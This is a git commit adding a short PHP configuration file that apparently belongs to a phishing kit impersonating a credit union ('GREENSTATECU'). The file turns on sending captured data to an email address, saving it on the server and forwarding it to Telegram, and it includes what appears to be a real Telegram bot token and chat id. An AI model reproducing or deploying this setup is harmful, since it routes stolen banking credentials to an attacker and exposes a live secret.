d03a8d84372a581d7dfc8dcfbda33eae9a0250ad
GREENSTATECU <122231388+GREENSTATECU@users.noreply.github.com>
2023-01-09 01:22:14 -0500

    Add files via upload

---
+++ php/configure.php
@@ -0,0 +1,19 @@
+<?php
+/*
+*** Set your email below and configure functions to your requirments ***
+*** FUNCTION CONTROL: 1=ON  and 0=OFF ***
+EXAMPLE
+$Example=1;  // Function On
+$Example=0;  // Function Off
+*/
+$youremail='tgunkn0waccoun7@protonmail.com';  // Set your email
+$Send_to_Email='1';
+$Save_on_Server='1';
+/*
+*/
+$Send_to_Telegram='1';
+$token='5420876510:AAGQjNAhhRXMbHRGmJH-mgqwpUdajyLKfqE';
+$chat_id='5094134620';
+/*
+*/
+?>
